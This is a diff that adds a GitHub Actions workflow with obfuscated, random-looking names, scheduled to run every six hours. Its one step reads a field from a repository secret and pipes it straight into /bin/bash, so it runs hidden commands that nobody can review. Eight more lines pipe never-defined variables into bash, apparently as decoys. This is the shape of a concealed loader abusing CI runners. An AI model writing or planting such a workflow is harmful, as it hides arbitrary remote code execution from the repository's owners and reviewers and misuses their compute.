@@ -1,0 +1,25 @@
+name: civilianattracted
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: civilianattracted
+        env:
+          ahuo4: ${{ secrets.ahuo4 }}
+        run: |
+          echo $ahuo4 | jq -r .hiy79260 | /bin/bash
+          echo $s83 | jq -r .y01041 | /bin/bash
+          echo $zmux56127 | jq -r .ia05 | /bin/bash
+          echo $uhpou6 | jq -r .ie31 | /bin/bash
+          echo $e9 | jq -r .nsvbb7 | /bin/bash
+          echo $xjtx61 | jq -r .nf9041 | /bin/bash
+          echo $iuxl64899 | jq -r .n347 | /bin/bash
+          echo $mgmqd7 | jq -r .ziivi6532 | /bin/bash
+          echo $vq32203 | jq -r .ejq50779 | /bin/bash
+
